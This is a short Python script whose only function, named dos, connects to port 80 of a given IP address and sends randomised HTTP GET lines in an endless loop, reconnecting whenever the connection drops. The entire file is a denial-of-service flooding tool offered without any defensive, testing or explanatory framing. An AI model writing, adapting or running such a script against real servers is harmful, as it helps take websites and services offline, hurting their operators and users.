import socket
from time import sleep
import random


def dos(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, 80))
    while 1:
        try:
            s.send('GET /?{} HTTP/1.1\r\n'.format(random.randint(0,10000)))
        except:
            s.close()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 80))
